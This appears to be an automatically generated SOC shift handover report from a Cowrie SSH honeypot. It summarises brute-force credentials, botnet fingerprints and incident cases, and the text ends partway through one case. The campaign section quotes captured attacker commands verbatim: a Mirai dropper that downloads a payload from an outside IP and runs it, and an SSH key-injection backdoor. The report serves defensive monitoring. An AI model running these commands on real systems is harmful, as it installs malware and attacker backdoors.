# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-06 |
| **Generated At** | 2026-09-06T13:29:08Z |
| **Shift Time** | 13:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **261** |
| Confirmed Threats | **239** |
| False Positives Filtered | **22** (8.4%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **29** |
| High Severity Cases | **129** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **132** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **177** |
| Unique Credential Pairs | **100** |
| Unique Usernames | **27** |
| Unique Passwords | **76** |
| Successful Auth Pairs | **120** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `admin` | 27 |
| `support` | 15 |
| `345gs5662d34` | 13 |
| `lghkel	` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 15 |
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `` | 10 |
| `zpz}ld	` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 15 |
| `345gs5662d34` | `345gs5662d34` | 13 |
| `admin` | `` | 10 |
| `lghkel	` | `zpz}ld	` | 7 |
| `root` | `3245gs5662d34` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123` | `80.94.92.234` | 2026-09-06T06:56:40 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-06T06:57:36 |
| `uucp` | `uucp` | `138.226.239.234` | 2026-09-06T06:58:22 |
| `root` | `1234` | `80.94.92.234` | 2026-09-06T06:59:28 |
| `root` | `12345` | `80.94.92.234` | 2026-09-06T07:02:17 |
| `username` | `password` | `77.90.185.17` | 2026-09-06T07:03:37 |
| `root` | `1234567` | `80.94.92.234` | 2026-09-06T07:07:50 |
| `root` | `12345678` | `80.94.92.234` | 2026-09-06T07:10:35 |
| `root` | `123456789` | `80.94.92.234` | 2026-09-06T07:13:14 |
| `root` | `1234567890` | `80.94.92.234` | 2026-09-06T07:15:54 |
| `root` | `123qwe` | `80.94.92.234` | 2026-09-06T07:18:26 |
| `support` | `support` | `10.0.0.73` | 2026-09-06T07:18:43 |
| `root` | `123qwerty` | `80.94.92.234` | 2026-09-06T07:21:19 |
| `root` | `ubuntu` | `106.12.7.70` | 2026-09-06T07:23:58 |
| `root` | `21` | `80.94.92.234` | 2026-09-06T07:24:47 |
| `root` | `321` | `80.94.92.234` | 2026-09-06T07:27:23 |
| `root` | `4321` | `80.94.92.234` | 2026-09-06T07:29:55 |
| `root` | `iwYpKi9&oE36.940766E-3103Xy` | `10.0.0.73` | 2026-09-06T07:31:41 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-06T07:31:46 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T07:31:48 |
| `root` | `54321` | `80.94.92.234` | 2026-09-06T07:32:27 |
| `root` | `654321` | `80.94.92.234` | 2026-09-06T07:35:02 |
| `root` | `P4ssw0rd` | `80.94.92.234` | 2026-09-06T07:37:37 |
| `root` | `Password$1` | `10.0.0.73` | 2026-09-06T07:37:49 |
| `root` | `P4ssword` | `80.94.92.234` | 2026-09-06T07:39:48 |
| `root` | `P@ssw0rd` | `80.94.92.234` | 2026-09-06T07:42:10 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.38.138.175` | 2026-09-06T07:43:05 |
| `*1` | `$4` | `34.38.138.175` | 2026-09-06T07:43:18 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5600` | `34.38.138.175` | 2026-09-06T07:43:20 |
| `root` | `Passw0rd` | `80.94.92.234` | 2026-09-06T07:44:26 |
| `root` | `p4ssword` | `80.94.92.234` | 2026-09-06T07:46:51 |
| `root` | `p@ssw0rd` | `80.94.92.234` | 2026-09-06T07:49:09 |
| `root` | `passw0rd` | `80.94.92.234` | 2026-09-06T07:51:43 |
| `erpnext` | `123456` | `10.0.0.73` | 2026-09-06T07:53:45 |
| `erpnext` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T07:53:51 |
| `root` | `password` | `80.94.92.234` | 2026-09-06T07:54:50 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-06T07:56:27 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-06T07:56:28 |
| `root` | `qwerty` | `80.94.92.234` | 2026-09-06T07:57:57 |
| `support` | `support` | `176.53.159.196` | 2026-09-06T07:59:35 |
| `root` | `root1` | `80.94.92.234` | 2026-09-06T08:02:24 |
| `root` | `admin` | `16.5.0.236` | 2026-09-06T08:03:28 |
| `root` | `root12` | `80.94.92.234` | 2026-09-06T08:04:29 |
| `root` | `root123` | `80.94.92.234` | 2026-09-06T08:06:49 |
| `mohammad` | `1234` | `10.0.0.73` | 2026-09-06T08:07:40 |
| `mohammad` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T08:07:46 |
| `farmacia` | `farmacia` | `10.0.0.73` | 2026-09-06T08:08:03 |
| `farmacia` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T08:08:09 |
| `root` | `root1234` | `80.94.92.234` | 2026-09-06T08:09:12 |
| `root` | `root12345` | `80.94.92.234` | 2026-09-06T08:11:50 |
| `root` | `root123456` | `80.94.92.234` | 2026-09-06T08:14:56 |
| `ubuntu` | `Admin123!` | `10.0.0.73` | 2026-09-06T08:17:57 |
| `root` | `root1234567` | `80.94.92.234` | 2026-09-06T08:18:02 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T08:18:04 |
| `root` | `root123456789` | `80.94.92.234` | 2026-09-06T08:20:32 |
| `root` | `root1234567890` | `80.94.92.234` | 2026-09-06T08:23:00 |
| `admin` | `1` | `80.94.92.234` | 2026-09-06T08:25:26 |
| `admin` | `12` | `80.94.92.234` | 2026-09-06T08:27:38 |
| `admin` | `123` | `80.94.92.234` | 2026-09-06T08:29:44 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.192` | 2026-09-06T08:30:51 |
| `admin` | `ZmqVfoSIP` | `112.185.230.208` | 2026-09-06T08:31:28 |
| `admin` | `1234` | `80.94.92.234` | 2026-09-06T08:31:51 |
| `root` | `zlxx` | `112.185.230.208` | 2026-09-06T08:32:02 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\x8f\x8c\x8d\x8a\x8b'` | `112.185.230.208` | 2026-09-06T08:32:36 |
| `lghkel	` | `zpz}ld	` | `112.185.230.208` | 2026-09-06T08:32:37 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xe4\xca\xdb\x8b\x8c\x8f'` | `112.185.230.208` | 2026-09-06T08:33:10 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\xdf\xda\xd3\xd7\xd0'` | `112.185.230.208` | 2026-09-06T08:33:44 |
| `admin` | `12345` | `80.94.92.234` | 2026-09-06T08:34:10 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\x8f\x8c\x8d\x8a\x8b\x88'` | `112.185.230.208` | 2026-09-06T08:34:18 |
| `b'\xcc\xd1\xd1\xca'` | `b'\x8f\x8c\x8d\x8a\x8b\x88'` | `112.185.230.208` | 2026-09-06T08:34:53 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.104.9` | 2026-09-06T08:35:34 |
| `*1` | `$4` | `34.77.104.9` | 2026-09-06T08:35:47 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 841` | `34.77.104.9` | 2026-09-06T08:35:49 |
| `admin` | `123456` | `80.94.92.234` | 2026-09-06T08:36:31 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xdf\xd0\xca\xcd\xd2\xcf'` | `112.185.230.208` | 2026-09-06T08:36:35 |
| `admin` | `1234567` | `80.94.92.234` | 2026-09-06T08:38:51 |
| `admin` | `12345678` | `80.94.92.234` | 2026-09-06T08:41:33 |
| `admin` | `123456789` | `80.94.92.234` | 2026-09-06T08:44:29 |
| `admin` | `1234567890` | `80.94.92.234` | 2026-09-06T08:46:51 |
| `admin` | `123qwe` | `80.94.92.234` | 2026-09-06T08:49:01 |
| `root` | `Root2020` | `103.143.238.100` | 2026-09-06T09:15:06 |
| `345gs5662d34` | `345gs5662d34` | `103.143.238.100` | 2026-09-06T09:15:08 |
| `root` | `3245gs5662d34` | `103.143.238.100` | 2026-09-06T09:15:08 |
| `root` | `welcome2024` | `186.103.169.12` | 2026-09-06T09:22:59 |
| `345gs5662d34` | `345gs5662d34` | `186.103.169.12` | 2026-09-06T09:23:02 |
| `root` | `3245gs5662d34` | `186.103.169.12` | 2026-09-06T09:23:03 |
| `root` | `Admin%123` | `103.49.239.153` | 2026-09-06T09:25:25 |
| `345gs5662d34` | `345gs5662d34` | `103.49.239.153` | 2026-09-06T09:25:29 |
| `root` | `3245gs5662d34` | `103.49.239.153` | 2026-09-06T09:25:31 |
| `admin` | `admin` | `43.255.104.5` | 2026-09-06T09:30:43 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-06T09:30:44 |
| `wordpress` | `wordpress` | `187.52.212.235` | 2026-09-06T09:31:47 |
| `345gs5662d34` | `345gs5662d34` | `187.52.212.235` | 2026-09-06T09:31:50 |
| `wordpress` | `3245gs5662d34` | `187.52.212.235` | 2026-09-06T09:31:51 |
| `support` | `support` | `138.226.239.233` | 2026-09-06T09:42:36 |
| `admin` | `admin` | `171.231.182.60` | 2026-09-06T09:51:34 |
| `root` | `admin` | `171.231.182.60` | 2026-09-06T09:54:13 |
| `installer` | `installer` | `171.231.182.60` | 2026-09-06T09:58:42 |
| `user` | `user` | `171.231.182.60` | 2026-09-06T10:02:07 |
| `ubnt` | `ubnt` | `171.231.182.60` | 2026-09-06T10:06:40 |
| `ftpuser` | `Passw0rd` | `196.192.181.202` | 2026-09-06T10:07:14 |
| `345gs5662d34` | `345gs5662d34` | `196.192.181.202` | 2026-09-06T10:07:18 |
| `ftpuser` | `3245gs5662d34` | `196.192.181.202` | 2026-09-06T10:07:20 |
| `squid` | `squid` | `171.231.182.60` | 2026-09-06T10:11:10 |
| `config` | `config` | `171.231.182.60` | 2026-09-06T10:15:27 |
| `support` | `support` | `171.231.182.60` | 2026-09-06T10:17:56 |
| `root` | `@` | `171.231.182.60` | 2026-09-06T10:23:38 |
| `admin` | `admin@123` | `171.231.182.60` | 2026-09-06T10:29:01 |
| `root` | `root123` | `171.231.192.158` | 2026-09-06T10:33:33 |
| `uucp` | `uucp` | `138.226.239.233` | 2026-09-06T10:36:59 |
| `system` | `OkwKcECs8qJP2Z` | `171.231.192.158` | 2026-09-06T10:38:05 |
| `ict` | `ict123` | `165.154.235.9` | 2026-09-06T11:52:02 |
| `345gs5662d34` | `345gs5662d34` | `165.154.235.9` | 2026-09-06T11:52:04 |
| `ict` | `3245gs5662d34` | `165.154.235.9` | 2026-09-06T11:52:05 |
| `root` | `asd123asd` | `103.239.252.132` | 2026-09-06T11:56:06 |
| `345gs5662d34` | `345gs5662d34` | `103.239.252.132` | 2026-09-06T11:56:10 |
| `root` | `3245gs5662d34` | `103.239.252.132` | 2026-09-06T11:56:12 |
| `root` | `1` | `80.94.92.234` | 2026-09-06T12:08:05 |
| `root` | `12` | `80.94.92.234` | 2026-09-06T12:11:11 |
| `admin` | `true` | `113.11.100.109` | 2026-09-06T12:37:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **261** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 75 |
| libssh | 33 |
| AsyncSSH (Python) | 13 |
| OpenSSH | 7 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 62 | 1 |
| `f555226df196...` | Mirai/variant | 20 | 8 |
| `fda360b1b4f4...` | Mirai/variant | 13 | 2 |
| `390ffe68a68c...` | Modern SSH client | 6 | 3 |
| `419da4c91ddb...` | Modern SSH client | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 62 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 20 | 8 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 13 | 2 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 6 | 3 | Modern SSH client |
| `419da4c91ddb...` | libssh | 5 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 5 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |
| **Recon Loader Script** | 🟡 MEDIUM | 59 | 1 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `16.5.0.236`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
/bin/busybox TOKEN
```
Source IPs: `113.11.100.109`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.235.9`, `196.192.181.202`, `103.49.239.153`, `186.103.169.12`, `187.52.212.235`, `103.143.238.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **36** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 25 | HIGH |
| `AS7552` | Viettel Group | 4 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS393406` | DigitalOcean, LLC | 3 | LOW |
| `AS25369` | Hydra Communications Ltd | 3 | HIGH |
| `AS49800` | GNC-Alfa CJSC | 2 | HIGH |
| `AS6849` | JSC Ukrtelecom | 1 | HIGH |
| `AS15311` | TELEFONICA EMPRESAS CHILE SA | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (129)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-76a7641a4d02

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 06:56 |
| **Last Seen** | 2026-09-06 06:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:56:37` | `cowrie.session.connect` |
| `2026-09-06 06:56:38` | `cowrie.client.version` |
| `2026-09-06 06:56:38` | `cowrie.client.kex` |
| `2026-09-06 06:56:40` | `cowrie.login.success` |
| `2026-09-06 06:56:42` | `cowrie.session.params` |
| `2026-09-06 06:56:42` | `cowrie.command.input` |
| `2026-09-06 06:56:42` | `cowrie.log.closed` |
| `2026-09-06 06:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72211b40dbc

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-06 06:58 |
| **Last Seen** | 2026-09-06 06:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:58:21` | `cowrie.session.connect` |
| `2026-09-06 06:58:21` | `cowrie.client.version` |
| `2026-09-06 06:58:21` | `cowrie.client.kex` |
| `2026-09-06 06:58:22` | `cowrie.login.success` |
| `2026-09-06 06:58:25` | `cowrie.direct-tcpip.request` |
| `2026-09-06 06:58:27` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 06:58:27` | `cowrie.direct-tcpip.data` |
| `2026-09-06 06:58:28` | `cowrie.direct-tcpip.request` |
| `2026-09-06 06:58:31` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 06:58:31` | `cowrie.direct-tcpip.data` |
| `2026-09-06 06:58:32` | `cowrie.direct-tcpip.request` |
| `2026-09-06 06:58:33` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 06:58:33` | `cowrie.direct-tcpip.data` |
| `2026-09-06 06:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4026c8965f0b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 06:59 |
| **Last Seen** | 2026-09-06 06:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:59:24` | `cowrie.session.connect` |
| `2026-09-06 06:59:25` | `cowrie.client.version` |
| `2026-09-06 06:59:25` | `cowrie.client.kex` |
| `2026-09-06 06:59:28` | `cowrie.login.success` |
| `2026-09-06 06:59:29` | `cowrie.session.params` |
| `2026-09-06 06:59:29` | `cowrie.command.input` |
| `2026-09-06 06:59:30` | `cowrie.log.closed` |
| `2026-09-06 06:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39a4e47e131e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:02 |
| **Last Seen** | 2026-09-06 07:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:02:14` | `cowrie.session.connect` |
| `2026-09-06 07:02:14` | `cowrie.client.version` |
| `2026-09-06 07:02:14` | `cowrie.client.kex` |
| `2026-09-06 07:02:17` | `cowrie.login.success` |
| `2026-09-06 07:02:19` | `cowrie.session.params` |
| `2026-09-06 07:02:19` | `cowrie.command.input` |
| `2026-09-06 07:02:20` | `cowrie.log.closed` |
| `2026-09-06 07:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f943fd642e0a

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-06 07:03 |
| **Last Seen** | 2026-09-06 07:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:03:36` | `cowrie.session.connect` |
| `2026-09-06 07:03:36` | `cowrie.client.version` |
| `2026-09-06 07:03:36` | `cowrie.client.kex` |
| `2026-09-06 07:03:37` | `cowrie.login.success` |
| `2026-09-06 07:03:39` | `cowrie.direct-tcpip.request` |
| `2026-09-06 07:03:40` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 07:03:40` | `cowrie.direct-tcpip.data` |
| `2026-09-06 07:03:40` | `cowrie.direct-tcpip.request` |
| `2026-09-06 07:03:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 07:03:41` | `cowrie.direct-tcpip.data` |
| `2026-09-06 07:03:42` | `cowrie.direct-tcpip.request` |
| `2026-09-06 07:03:43` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 07:03:43` | `cowrie.direct-tcpip.data` |
| `2026-09-06 07:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f5782137471

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:07 |
| **Last Seen** | 2026-09-06 07:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:07:47` | `cowrie.session.connect` |
| `2026-09-06 07:07:48` | `cowrie.client.version` |
| `2026-09-06 07:07:48` | `cowrie.client.kex` |
| `2026-09-06 07:07:50` | `cowrie.login.success` |
| `2026-09-06 07:07:51` | `cowrie.session.params` |
| `2026-09-06 07:07:51` | `cowrie.command.input` |
| `2026-09-06 07:07:52` | `cowrie.log.closed` |
| `2026-09-06 07:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c36d1d2754a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:10 |
| **Last Seen** | 2026-09-06 07:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 07:10:31` | `cowrie.session.connect` |
| `2026-09-06 07:10:32` | `cowrie.client.version` |
| `2026-09-06 07:10:32` | `cowrie.client.kex` |
| `2026-09-06 07:10:35` | `cowrie.login.success` |
| `2026-09-06 07:10:37` | `cowrie.session.params` |
| `2026-09-06 07:10:37` | `cowrie.command.input` |
| `2026-09-06 07:10:38` | `cowrie.log.closed` |
| `2026-09-06 07:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e749306f8c21

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 07:13 |
| **Last Seen** | 2026-09-06 07:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
